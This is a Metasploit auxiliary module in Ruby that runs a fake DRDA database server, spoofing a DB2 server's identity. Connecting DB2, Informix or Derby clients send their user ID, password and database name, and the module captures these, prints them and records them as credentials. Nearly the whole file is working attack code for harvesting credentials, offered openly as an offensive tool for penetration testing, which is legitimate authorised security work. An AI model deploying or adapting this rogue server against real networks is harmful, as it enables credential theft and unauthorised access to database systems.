# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  class Constants
    CODEPOINT_ACCSEC = 0x106d
    CODEPOINT_SECCHK = 0x106e
    CODEPOINT_SRVCLSNM = 0x1147
    CODEPOINT_SRVCOD = 0x1149
    CODEPOINT_SRVRLSLV = 0x115a
    CODEPOINT_EXTNAM = 0x115e
    CODEPOINT_SRVNAM = 0x116d
    CODEPOINT_USERID = 0x11a0
    CODEPOINT_PASSWORD = 0x11a1
    CODEPOINT_SECMEC = 0x11a2
    CODEPOINT_SECCHKCD = 0x11a4
    CODEPOINT_SECCHKRM = 0x1219
    CODEPOINT_MGRLVLLS = 0x1404
    CODEPOINT_EXCSATRD = 0x1443
    CODEPOINT_ACCSECRD = 0x14ac
    CODEPOINT_RDBNAM = 0x2110
  end

  def initialize
    super(
      'Name' => 'Authentication Capture: DRDA (DB2, Informix, Derby)',
      'Description' => %q{
        This module provides a fake DRDA (DB2, Informix, Derby) server
      that is designed to capture authentication credentials.
      },
      'Author' => 'Patrik Karlsson <patrik[at]cqure.net>',
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Capture', { 'Description' => 'Run DRDA capture server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 50000 ])
      ]
    )
  end

  def setup
    super
    @state = {}
  end

  def run
    exploit
  end

  def on_client_connect(client)
    @state[client] = {
      name: "#{client.peerhost}:#{client.peerport}",
      ip: client.peerhost,
      port: client.peerport,
      user: nil,
      pass: nil,
      database: nil
    }
  end

  # translates EBDIC to ASCII
  def drda_ascii_to_ebdic(str)
    a2e = [
      '00010203372D2E2F1605250B0C0D0E0F101112133C3D322618193F271C1D1E1F' \
        '405A7F7B5B6C507D4D5D5C4E6B604B61F0F1F2F3F4F5F6F7F8F97A5E4C7E6E6F' \
        '7CC1C2C3C4C5C6C7C8C9D1D2D3D4D5D6D7D8D9E2E3E4E5E6E7E8E9ADE0BD5F6D' \
        '79818283848586878889919293949596979899A2A3A4A5A6A7A8A9C04FD0A107' \
        '202122232415061728292A2B2C090A1B30311A333435360838393A3B04143EE1' \
        '4142434445464748495152535455565758596263646566676869707172737475' \
        '767778808A8B8C8D8E8F909A9B9C9D9E9FA0AAABAC4AAEAFB0B1B2B3B4B5B6B7' \
        'B8B9BABBBC6ABEBFCACBCCCDCECFDADBDCDDDEDFEAEBECEDEEEFFAFBFCFDFEFF'
    ].pack('H*')
    str.unpack('C*').map { |c| a2e[c] }.pack('A' * str.length)
  end

  # translates ASCII to EBDIC
  def drda_ebdic_to_ascii(str)
    e2a = [
      '000102039C09867F978D8E0B0C0D0E0F101112139D8508871819928F1C1D1E1F' \
        '80818283840A171B88898A8B8C050607909116939495960498999A9B14159E1A' \
        '20A0A1A2A3A4A5A6A7A8D52E3C282B7C26A9AAABACADAEAFB0B121242A293B5E' \
        '2D2FB2B3B4B5B6B7B8B9E52C255F3E3FBABBBCBDBEBFC0C1C2603A2340273D22' \
        'C3616263646566676869C4C5C6C7C8C9CA6A6B6C6D6E6F707172CBCCCDCECFD0' \
        'D17E737475767778797AD2D3D45BD6D7D8D9DADBDCDDDEDFE0E1E2E3E45DE6E7' \
        '7B414243444546474849E8E9EAEBECED7D4A4B4C4D4E4F505152EEEFF0F1F2F3' \
        '5C9F535455565758595AF4F5F6F7F8F930313233343536373839FAFBFCFDFEFF'
    ].pack('H*')
    str.unpack('C*').map { |c| e2a[c] }.pack('A' * str.length)
  end

  # parses and returns a DRDA parameter
  def drda_parse_parameter(data)
    param = {
      length: data.slice!(0, 2).unpack('n')[0],
      codepoint: data.slice!(0, 2).unpack('n')[0],
      data: ''
    }
    param[:data] = drda_ebdic_to_ascii(data.slice!(0, param[:length] - 4).unpack('A*')[0])
    param
  end

  # creates a DRDA parameter
  def drda_create_parameter(codepoint, data)
    param = {
      codepoint: codepoint,
      data: drda_ascii_to_ebdic(data),
      length: data.length + 4
    }
    param
  end

  # creates a DRDA CMD with parameters and returns it as an opaque string
  def drda_create_cmd(codepoint, options = { format: 0x43, correlid: 0x01 }, params = [])
    data = ''
    for p in params.each
      data << [p[:length]].pack('n')
      data << [p[:codepoint]].pack('n')
      data << [p[:data]].pack('A*')
    end

    hdr = ''
    hdr << [data.length + 10].pack('n')
    hdr << [0xd0].pack('C') # magic
    hdr << [options[:format]].pack('C') # format
    hdr << [options[:correlid]].pack('n') # corellid
    hdr << [data.length + 4].pack('n') # length2
    hdr << [codepoint].pack('n')

    data = hdr + data
    data
  end

  # parses a response and returns an array with commands and parameters
  def drda_parse_response(data)
    result = []

    until data.empty?
      cp = {
        length: data.slice!(0, 2).unpack('n')[0],
        magic: data.slice!(0, 1).unpack('C')[0],
        format: data.slice!(0, 1).unpack('C')[0],
        corellid: data.slice!(0, 2).unpack('n')[0],
        length2: data.slice!(0, 2).unpack('n')[0],
        codepoint: data.slice!(0, 2).unpack('n')[0],
        params: []
      }
      cpdata = data.slice!(0, cp[:length] - 10)
      cp[:params] << drda_parse_parameter(cpdata) until cpdata.empty?
      result << cp
    end
    result
  end

  # sends of a DRDA command
  def drda_send_cmd(client, cmd)
    data = ''
    cmd.each { |d| data << d }
    client.put data
  end

  def on_client_data(client)
    data = client.get_once

    return if !data

    for cmd in drda_parse_response(data).each
      case cmd[:codepoint]
      when Constants::CODEPOINT_ACCSEC
        params = []
        params << drda_create_parameter(Constants::CODEPOINT_EXTNAM, 'DB2     db2sysc 05D80B00%FED%Y00')
        params << drda_create_parameter(Constants::CODEPOINT_MGRLVLLS, ['9d03008e847f008e1c970000840f00979d20008d9dbe0097'].pack('H*'))
        params << drda_create_parameter(Constants::CODEPOINT_SRVCLSNM, 'QDB2/NT64')
        params << drda_create_parameter(Constants::CODEPOINT_SRVNAM, 'DB2')
        params << drda_create_parameter(Constants::CODEPOINT_SRVRLSLV, 'SQL10010')

        cmd = []
        cmd << drda_create_cmd(Constants::CODEPOINT_EXCSATRD, { format: 0x43, correlid: 1 }, params)

        params = []
        params << drda_create_parameter(Constants::CODEPOINT_SECMEC, "\x00\x03")
        cmd << drda_create_cmd(Constants::CODEPOINT_ACCSECRD, { format: 3, correlid: 2 }, params)

        drda_send_cmd(client, cmd)

      when Constants::CODEPOINT_SECCHK
        for p in cmd[:params].each
          case p[:codepoint]
          when Constants::CODEPOINT_USERID
            @state[client][:user] = p[:data].rstrip
          when Constants::CODEPOINT_PASSWORD
            @state[client][:pass] = p[:data].rstrip
          when Constants::CODEPOINT_RDBNAM
            @state[client][:database] = p[:data].rstrip
          end
        end
        # else
        #   print_status("unhandled codepoint: #{cmd[:codepoint]}")
        #   ignore unhandled codepoints
      end
    end

    if @state[client][:user] && @state[client][:pass]
      print_good("DRDA LOGIN #{@state[client][:name]} Database: #{@state[client][:database]}; #{@state[client][:user]} / #{@state[client][:pass]}")
      report_cred(
        ip: @state[client][:ip],
        port: datastore['SRVPORT'],
        service_name: 'db2_client',
        user: @state[client][:user],
        password: @state[client][:pass],
        proof: @state.inspect
      )

      params = []
      params << drda_create_parameter(Constants::CODEPOINT_SRVCOD, "\x00\x97")
      params << drda_create_parameter(Constants::CODEPOINT_SECCHKCD, "\x0f")

      cmd = []
      cmd << drda_create_cmd(Constants::CODEPOINT_SECCHKRM, { format: 2, correlid: 1 }, params)

      drda_send_cmd(client, cmd)
      # client.close
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_close(client)
    @state.delete(client)
  end
end
